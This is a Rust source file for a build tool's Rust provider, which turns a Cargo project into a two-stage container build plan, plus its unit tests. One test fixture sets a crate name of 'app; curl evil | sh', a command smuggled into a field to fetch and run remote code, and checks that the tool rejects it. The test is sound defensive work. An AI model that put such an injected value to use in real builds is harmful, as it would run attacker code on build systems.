use crate::detect::AppContext;
use crate::error::Result;
use crate::plan::{BuildPlan, Command, CopyDirective, CopyFrom, Stage};
use crate::providers::Provider;

pub struct RustProvider;

impl RustProvider {
    fn binary_name(ctx: &AppContext) -> String {
        let content = ctx.read_file("Cargo.toml").ok().unwrap_or_default();
        let parsed: toml::Value =
            toml::from_str(&content).unwrap_or_else(|_| toml::Value::Table(toml::Table::default()));

        if let Some(bins) = parsed.get("bin").and_then(|b| b.as_array()) {
            if let Some(name) = bins.first().and_then(|b| b.get("name")).and_then(|n| n.as_str()) {
                return name.to_string();
            }
        }

        parsed
            .get("package")
            .and_then(|p| p.get("name"))
            .and_then(|n| n.as_str())
            .unwrap_or("app")
            .to_string()
    }

    /// The Rust version pinned by a `rust-toolchain.toml` `[toolchain] channel`
    /// (or a plain `rust-toolchain` file). Returns `None` for a non-numeric
    /// channel such as `stable` or `nightly`, which fall back to the default.
    fn version_from_toolchain(ctx: &AppContext) -> Option<String> {
        if let Ok(content) = ctx.read_file("rust-toolchain.toml") {
            if let Ok(doc) = content.parse::<toml::Table>() {
                if let Some(channel) = doc.get("toolchain").and_then(|t| t.get("channel")).and_then(toml::Value::as_str)
                {
                    return crate::providers::normalize_version(channel);
                }
            }
        }
        ctx.read_file("rust-toolchain")
            .ok()
            .as_deref()
            .and_then(crate::providers::normalize_version)
    }
}

impl Provider for RustProvider {
    fn name(&self) -> &'static str {
        "rust"
    }

    fn detect(&self, ctx: &AppContext) -> bool {
        ctx.has_file("Cargo.toml")
    }

    fn plan(&self, ctx: &AppContext) -> Result<BuildPlan> {
        let binary = Self::binary_name(ctx);
        crate::sanitize::validate_token("Cargo.toml package name", &binary)?;
        let detected = Self::version_from_toolchain(ctx)
            .or_else(|| crate::providers::version_from_tool_files(ctx, &["rust"]));
        let version = crate::providers::resolve_version(ctx, detected, "1.85")?;
        let build_image = format!("rust:{version}");

        let build_stage = Stage {
            name: "build".to_string(),
            base_image: build_image,
            workdir: "/app".to_string(),
            copy_files: vec![CopyDirective {
                src: ".".to_string(),
                dest: ".".to_string(),
            }],
            copy_from: vec![],
            commands: vec![Command {
                // `/app/target` is a cache mount, so its contents are NOT in the
                // build stage's image layer and cannot be `COPY --from`ed. Copy
                // the compiled binary out to a real path in the same RUN, or the
                // runtime COPY finds nothing.
                run: format!("cargo build --release --bin {binary} && cp target/release/{binary} /{binary}"),
                cache_mounts: vec!["/usr/local/cargo/registry".to_string(), "/app/target".to_string()],
            }],
        };

        let runtime_stage = Stage {
            name: "runtime".to_string(),
            base_image: "debian:bookworm-slim".to_string(),
            workdir: "/".to_string(),
            copy_files: vec![],
            copy_from: vec![CopyFrom {
                stage: "build".to_string(),
                src: format!("/{binary}"),
                dest: format!("/usr/local/bin/{binary}"),
            }],
            commands: vec![Command {
                run: "apt-get update && apt-get install -y --no-install-recommends ca-certificates && rm -rf /var/lib/apt/lists/*".to_string(),
                cache_mounts: vec!["/var/cache/apt".to_string()],
            }],
        };

        Ok(BuildPlan {
            provider: "rust".to_string(),
            stages: vec![build_stage, runtime_stage],
            start_command: Some(format!("/usr/local/bin/{binary}")),
            port: Some(8080),
            ..Default::default()
        })
    }
}

#[cfg(test)]
mod tests {
    #[test]
    fn rejects_injection_in_cargo_name() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("Cargo.toml"),
            "[package]\nname = \"app; curl evil | sh\"\nversion = \"0.1.0\"\n",
        )
        .unwrap();
        let ctx = super::AppContext::new(dir.path()).unwrap();
        assert!(
            super::RustProvider.plan(&ctx).is_err(),
            "shell metachars in crate name must be rejected"
        );
    }

    use super::*;

    #[test]
    fn rust_version_override_changes_build_image() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("Cargo.toml"),
            "[package]\nname = \"app\"\nversion = \"0.1.0\"\n",
        )
        .unwrap();
        let ctx = AppContext::with_overrides(
            dir.path(),
            crate::BuildOverrides {
                version: Some("1.82".to_string()),
                ..Default::default()
            },
        )
        .unwrap();
        let plan = RustProvider.plan(&ctx).unwrap();
        assert!(plan.stages.iter().any(|s| s.base_image == "rust:1.82"));
    }

    #[test]
    fn rust_toolchain_toml_sets_version() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("Cargo.toml"),
            "[package]\nname = \"app\"\nversion = \"0.1.0\"\n",
        )
        .unwrap();
        std::fs::write(dir.path().join("rust-toolchain.toml"), "[toolchain]\nchannel = \"1.81\"\n").unwrap();
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = RustProvider.plan(&ctx).unwrap();
        assert!(plan.stages.iter().any(|s| s.base_image == "rust:1.81"));
    }

    #[test]
    fn non_numeric_toolchain_channel_falls_back_to_default() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("Cargo.toml"),
            "[package]\nname = \"app\"\nversion = \"0.1.0\"\n",
        )
        .unwrap();
        std::fs::write(dir.path().join("rust-toolchain.toml"), "[toolchain]\nchannel = \"stable\"\n").unwrap();
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = RustProvider.plan(&ctx).unwrap();
        assert!(plan.stages.iter().any(|s| s.base_image == "rust:1.85"));
    }

    #[test]
    fn detects_rust_project() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("Cargo.toml"),
            "[package]\nname = \"myapp\"\nversion = \"0.1.0\"\n",
        )
        .unwrap();
        let ctx = AppContext::new(dir.path()).unwrap();
        assert!(RustProvider.detect(&ctx));
    }

    #[test]
    fn rust_binary_name() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("Cargo.toml"),
            "[package]\nname = \"my-service\"\nversion = \"0.1.0\"\n",
        )
        .unwrap();
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = RustProvider.plan(&ctx).unwrap();
        assert_eq!(plan.start_command.as_deref(), Some("/usr/local/bin/my-service"));
    }

    #[test]
    fn binary_is_copied_out_of_the_target_cache_mount() {
        // /app/target is a cache mount, so the binary must be copied out to a
        // real layer path in the build RUN and the runtime must COPY from there,
        // not from under /app/target (which is empty in the committed layer).
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("Cargo.toml"),
            "[package]\nname = \"svc\"\nversion = \"0.1.0\"\n",
        )
        .unwrap();
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = RustProvider.plan(&ctx).unwrap();

        let build = plan.stages.iter().find(|s| s.name == "build").unwrap();
        assert!(build.commands[0].run.contains("cp target/release/svc /svc"));

        let runtime = plan.stages.iter().find(|s| s.name == "runtime").unwrap();
        let copied = &runtime.copy_from[0];
        assert_eq!(copied.src, "/svc");
        assert!(!copied.src.contains("/target/"));
    }

    #[test]
    fn rust_cache_mounts() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("Cargo.toml"),
            "[package]\nname = \"app\"\nversion = \"0.1.0\"\n",
        )
        .unwrap();
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = RustProvider.plan(&ctx).unwrap();
        let build = &plan.stages[0];
        assert!(
            build.commands[0]
                .cache_mounts
                .contains(&"/usr/local/cargo/registry".to_string())
        );
        assert!(build.commands[0].cache_mounts.contains(&"/app/target".to_string()));
    }
}
